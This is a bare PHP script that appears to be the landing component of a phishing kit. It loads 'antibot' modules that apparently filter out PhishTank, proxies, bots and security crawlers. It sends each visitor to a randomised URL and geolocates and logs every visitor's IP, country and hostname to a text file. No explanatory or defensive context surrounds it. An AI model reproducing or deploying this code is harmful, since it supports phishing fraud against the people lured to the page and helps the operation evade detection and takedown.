<?php

session_start();
error_reporting(0);


include "./a/mkwd.php";
include "./a/3.php";
include "./a/5.php";
include "./a/8.php";
include "./a/9.php";
include "./a/10.php";
include "./a/11.php";
include "./a/12.php";
include "./a/antibot_host.php";
include "./a/antibot_ip.php";
include "./a/antibot_phishtank.php";
include "./a/antibot_userAgent.php";
include "./a/antibot_proxy.php";




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

    HEADER("Location: ./se?".md5(microtime())."");

date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // 
$_SESSION['COUNTRYIP'] = $COUNTRY;
$COUNTRYCODE = $J7->geoplugin_countryCode ; // 




$wcv = $ip.   "   [".date('Y-m-d H:i:s')."]   "   .$COUNTRY.   " - "   .$hostname;
file_put_contents('v.txt', $wcv . PHP_EOL, FILE_APPEND);


?>